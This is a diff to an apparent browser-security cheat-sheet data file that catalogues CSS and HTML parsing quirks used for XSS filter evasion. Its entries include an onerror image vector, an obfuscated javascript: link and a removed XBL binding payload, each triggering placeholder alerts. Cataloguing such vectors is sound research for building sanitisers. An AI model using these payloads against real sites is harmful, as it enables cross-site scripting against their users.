@@ -1380,7 +1380,7 @@ var items =
         'tags'       : ['xss', 'javascript', 'opera', 'css', 'hijacking', 'proprietary'],
         'reporter'   : '.mario'
     },
-    { /* ID 45 - Opera and Firefox css-string breaking  */
+    { /* ID 45 -  CSS-string breaking  */
         'id'         : 45,
         'category'   : 'css', 
         'name'       : {
@@ -1409,8 +1409,8 @@ var items =
             'chrome': ['3.0', '4.0', '5.0', '6.0'],
             'safari': ['3.0', '4.0']
         },
-        'tags'       : ['xss', 'opera', 'firefox', 'chrome', 'firefox', 'css', 'trick' ],
-        'reporter'   : 'LeverOne, .mario'
+        'tags'       : ['trick', 'opera', 'firefox', 'chrome', 'firefox', 'css'],
+        'reporter'   : 'Michal Zalewski'
     },
     { /* ID 46 - Alternative css-syntax in Internet Explorer  */
         'id'         : 46,
@@ -1860,27 +1860,20 @@ var items =
         'tags'       : ['xss', 'javascript', 'internet explorer', 'script', 'dom', 'innerhtml'],
         'reporter'   : 'hasegawayosuke'
     },
-    { /* ID 60 - Obfuscation unsafe css-properties without encoding and backslash */
+    { /* ID 60 - Obfuscation css-properties and values via ignored extra characters */
         'id'         : 60,
         'category'   : 'css', 
         'name'       : {
-            'en' : 'Obfuscation unsafe css-properties without encoding and backslash',
+            'en' : 'Obfuscation css-properties and values via ignored extra characters',
             'ja' : '',
-            'ru' : 'Обфускация опасных css-свойств без кодирования и обратного слеша',
+            'ru' : 'Обфускация css-свойств и значений с помощью игнорируемых дополнительных символов',
             'de' : ''
         },
-        'data'       : '<div style="	 \n/**/{-moz-binding/**/ 	\n:url(%xbl_path%)"><div style="{/**/-o-link/**/:\'%js_uri_alert%\'"><div style={/**/-o-link-source/**/:current><div style=***:)(@~][\'foo:foo\'$%^&#*beha/**/vior/**/:url(#default#time2) style=***:)(@~][\'foo:foo\'$%^&#*beha/**/vior,foo)(@~][\'foo:foo\'$%^&#*:url(#default#time2) onend=%js_alert% end=0>XXX',
-        'attachment' : {
-            'required_mime' : '',
-            'samedomain'    : '1',            
-            'path'          : 'http://heideri.ch/jso/test.xbl',
-            'name'          : 'test.xbl',
-            'raw'           : '<?xml version="1.0" ?><bindings xmlns="http://www.mozilla.org/xbl"><binding id="xss"><implementation><constructor><![CDATA[%js_alert%]]></constructor></implementation></binding></bindings>'
-        },
+        'data'       : '<div style="[a]color[b]:[c]red">XXX</div>',
         'description': {
-            'en' : 'All browsers allow to use whitespace (\\x20,\\x09,\\x0A,\\x0D) and css-comment before and after the properties. In addition, left curly brace ({) can precede the property in Opera and FF. IE allows to use many other non-alphanumeric characters and css-strings before and after (quirks mode only) properties. This is shown in the example. Also IE ignores NULL-character.',
+            'en' : '[a] Extra characters* ignored before property names (excluding backslash (92))\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32\nFirefox, Internet Explorer, Opera: 123**\nFirefox 3.x, Internet Explorer: 8\nInternet Explorer: 0-7,11,14-31,33,35-38,40-44,46-47,58,60-64,91,93-96,124-127,160,8192-8203,12288,65279\nInternet Explorer: CSS-strings\n\n[b] Extra characters ignored between property names and colon.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32\nInternet Explorer: 0,11\nInternet Explorer (quirks mode): 1-8,14-31,33,35-38,40-44,46-47,60,62-64,91,93,94,96,123,124,126,127\nInternet Explorer (quirks mode): CSS-strings, alnum sequences after non-alnum characters (color,foo:red)\n\n[c] Extra characters ignored before values\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32\nInternet Explorer: 0,11,160,8192-8203,12288,65279\n\n* These are given in decimal codes.\n** Ignored only before first property names.',
             'ja' : '',
-            'ru' : 'Все браузеры позволяют использовать пробельные символы (\\x20,\\x09,\\x0A,\\x0D) и css-комментарии до и после свойств. Кроме того, в FF и Opera свойству может предшествовать левая фигурная скобка ({). IE допускает использовать множество других не буквенно-цифровых символов и строки до и после (только в режиме совместимости) свойств. Это показано в примере. Также IE игнорирует нулевой символ.',
+            'ru' : '[a] Дополнительные символы*, игнорируемые до имени свойства (за исключением обратного слеша (92))\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32\nFirefox, Internet Explorer, Opera: 123**\nFirefox 3.x, Internet Explorer: 8\nInternet Explorer: 0-7,11,14-31,33,35-38,40-44,46-47,58,60-64,91,93-96,124-127,160,8192-8203,12288,65279\nInternet Explorer: CSS-строки\n\n[b] Дополнительные символы, игнорируемые между именем свойства и двоеточием.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32\nInternet Explorer: 0,11\nInternet Explorer (режим совместимости): 1-8,14-31,33,35-38,40-44,46-47,60,62-64,91,93,94,96,123,124,126,127\nInternet Explorer (режим совместимости): CSS-строки, буквенно-цифровые последовательности после небуквенно-цифровых символов (color,foo:red)\n\n[c] Дополнительные символы, игнорируемые перед значениями.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32\nInternet Explorer: 0,11,160,8192-8203,12288,65279\n\n*Приведены десятичные коды соответствующих символов.\n**Игнорируется только перед первым именем свойства.',
             'de' : ''
         },
         'urls'    : [],
@@ -1891,12 +1884,14 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-            'firefox': ['1.5', '2.x', '3.x'],
-            'opera': ['8.x', '9.x', '10.x', 'mobile'],
-            'internet explorer': ['6.0', '7.0', '8.0', '9.0']
+            'firefox': ['2.x', '3.x'],
+            'opera': ['9.x', '10.x', 'mobile'],
+            'internet explorer': ['6.0', '7.0', '8.0'],
+            'chrome' : ['5.0', '6.0'],
+            'safari' : ['4.x', '5.x']
         },
-        'tags'       : ['xss', 'javascript', 'css', 'quirks mode', 'obfuscation', 'opera', 'firefox', 'internet explorer'],
-        'reporter'   : 'LeverOne, sdc'
+        'tags'       : ['trick', 'css', 'quirks mode', 'obfuscation', 'opera', 'firefox', 'internet explorer', 'chrome', 'safari', 'fuzzing'],
+        'reporter'   : 'Gareth, hasegawayosuke, LeverOne, .mario, RSnake, sdc'
     },
     { /* ID 61 - CSS-encoding and backslashing */
         'id'         : 61,
@@ -1934,7 +1929,7 @@ var items =
             'internet explorer': ['6.0', '7.0', '8.0', '9.0']
         },
         'tags'       : ['xss', 'javascript', 'css', 'encoding', 'escape', 'backslash', 'opera', 'firefox', 'internet explorer'],
-        'reporter'   : 'Gareth, LeverOne,'
+        'reporter'   : 'Gareth, LeverOne, Renaud Lifchitz'
     },
     { /* ID 62 - Simulating attribute in IE */
         'id'         : 62,
@@ -3093,9 +3088,105 @@ var items =
             ],
             'firefox': [
                 '2.x', '3.x'
-            ], 
+            ] 
         },
         'tags'       : ['xss', 'javascript', 'internet explorer', 'script', 'dom', 'innerhtml', 'css'],
         'reporter'   : 'sdc'
+    },
+    { /* ID 99 - Using comments to obfuscate styles */
+        'id'         : 99,
+        'category'   : 'css', 
+        'name'       : {
+            'en' : 'Using comments to obfuscate styles',
+            'ja' : '',
+            'ru' : 'Использование комментариев для обфускации стилей',
+            'de' : ''
+        },
+        'data'       : 'XXX<style>*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;}</style>',
+        'description': {
+	    'en' : 'All browsers allow to use CSS-comments before and after the properties and values. In addition, Internet Explorer allows to use comments in values. Also it\'s possible for Internet Explorer and Safari to obfuscate comment inside the tag <STYLE> via unencoded null character.',
+            'ja' : '',
+            'ru' : 'Все браузеры позволяют использовать CSS-комментарии до и после свойств и их значений. Кроме того, Internet Explorer позволяет использовать комментарии в значениях свойств. Также в Internet Explorer и Safari в теге <STYLE> воспринимается комментарий, обфусцированный с помощью незакодированного нулевого символа.',
+            'de' : ''
+        },
+        'urls'    : [],
+        'howtofix'   : {
+            'en' : '',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'internet explorer': ['6.0', '7.0', '8.0'],
+            'firefox': ['3.x', '4.x'],
+            'opera'  : ['9.x', '10.x', 'mobile'],
+            'chrome' : ['4.0', '5.0', '6.0'],
+            'safari' : ['3.x', '4.x', '5.x'],
+        },
+        'tags'       : ['trick', 'css', 'obfuscation', 'internet explorer', 'firefox', 'opera', 'chrome', 'safari', 'comment'],
+        'reporter'   : 'Roman Ivanov, LeverOne'
+    },
+    { /* ID 100 - HTML separators and ignored characters */
+        'id'         : 100,
+        'category'   : 'html', 
+        'name'       : {
+            'en' : 'HTML separators and ignored characters',
+            'ja' : '',
+            'ru' : 'Разделители и игнорируемые символы в HTML',
+            'de' : ''
+        },
+        'data'       : '<img[a][b][c]src[d]=x[e]onerror=[f]"%js_alert%">',
+        'description': {
+	    'en' : '[a] Characters* ignored after tag names (and not accepted as tag name/attribute separators).\n\nInternet Explorer, Safari** : 0\nSafari : 47\nFirefox 3.x : 11,12\n\n[b] Characters accepted as tag name/attribute separators.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,13,32\nFirefox 4.x, Internet Explorer, Safari, Google Chrome, Opera : 12\nFirefox, Internet Explorer, Google Chrome, Opera : 47\nInternet Explorer, Safari: 11\n\n[c] Characters ignored before attributes (and not accepted as parameter/attribute separators).\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 47\nFirefox 3.x, Safari : 34,39\nInternet Explorer : 0\n\n[d] Characters ignored between attribute name and equals sign.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,13,32\nFirefox 4.x, Internet Explorer, Safari, Google Chrome, Opera : 12\nSafari, Internet Explorer : 0,11\nSafari : 47\n\n[e] Characters accepted as parameter/attribute separators.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,13,32\nFirefox 4.x, Internet Explorer, Safari, Google Chrome, Opera : 12\nSafari, Internet Explorer : 11\n\n[f] Characters ignored between equals sign and parameter.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,13,32\nFirefox 4.x, Internet Explorer, Safari, Google Chrome, Opera : 12\nSafari, Internet Explorer : 11\nInternet Explorer : 0\n\n* These are given in decimal codes.\n** Null character in Safari is a divider (only the left part of the tag name or attribute name still valid).',
+            'ja' : '',
+            'ru' : '[a] Символы*, игнорируемые после имени тега (и не являющиеся при этом разделителями имени тега и атрибута).\n\nInternet Explorer, Safari** : 0\nSafari : 47\nFirefox 3.x : 11,12\n\n[b] Символы, воспринимаемые в качестве разделителей имени тега и атрибута.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,13,32\nFirefox 4.x, Internet Explorer, Safari, Google Chrome, Opera : 12\nFirefox, Internet Explorer, Google Chrome, Opera : 47\nInternet Explorer, Safari: 11\n\n[c] Символы, игнорируемые перед атрибутом (и не являющиеся при этом разделителями параметра и атрибута).\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 47\nFirefox 3.x, Safari : 34,39\nInternet Explorer : 0\n\n[d] Симолы, игнорируемые между именем атрибута и знаком равенства.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,13,32\nFirefox 4.x, Internet Explorer, Safari, Google Chrome, Opera : 12\nSafari, Internet Explorer : 0,11\nSafari : 47\n\n[e] Символы, воспринимаемые в качестве разделителей параметра и атрибута.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,13,32\nFirefox 4.x, Internet Explorer, Safari, Google Chrome, Opera : 12\nSafari, Internet Explorer : 11\n\n[f] символы, игнорируемые между знаком равенства и параметром.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,13,32\nFirefox 4.x, Internet Explorer, Safari, Google Chrome, Opera : 12\nSafari, Internet Explorer : 11\nInternet Explorer : 0\n\n* Приведены в десятичных кодах.\n** Нулевой символ в Safari - это символ-отсекатель (остаётся действительной только левая часть имени тега или параметра).',
+            'de' : ''
+        },
+        'urls'    : [],
+        'howtofix'   : {
+            'en' : '',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'internet explorer': ['6.0', '7.0', '8.0'],
+            'firefox': ['3.x', '4.x'],
+            'opera'  : ['9.x', '10.x', 'mobile'],
+            'chrome' : ['5.0', '6.0'],
+            'safari' : ['4.x', '5.x'],
+        },
+        'tags'       : ['xss', 'internet explorer', 'firefox','opera', 'chrome', 'safari', 'separator'],
+        'reporter'   : 'hasegawayosuke, LeverOne, .mario, RSnake, '
+    },
+    { /* ID 101 -  Characters ignored in the URI (Safari and Google Chrome) */
+        'id'         : 101,
+        'category'   : 'html', 
+        'name'       : {
+            'en' : 'Characters ignored in the URI (Safari and Google Chrome)',
+            'ja' : '',
+            'ru' : 'Символы, игнорируемые в URI (Safari and Google Chrome)',
+            'de' : ''
+        },
+        'data'       : '<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:%js_alert%>XXX</a>',
+        'description': {
+	    'en' : '',
+            'ja' : '',
+            'ru' : 'This exsample shows that Google Chrome and Safari ignore the following characters in the URI (excluding 9,10,13) : 1-8,11,12. Also Safari ignores in the URI unencoded null character.',
+            'de' : ''
+        },
+        'urls'    : [],
+        'howtofix'   : {
+            'en' : '',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'chrome' : ['5.0', '6.0'],
+            'safari' : ['4.x', '5.x'],
+        },
+        'tags'       : ['xss', 'javascript', 'internet explorer', 'script', 'chrome', 'safari'],
+        'reporter'   : 'LeverOne'
     }
 ]
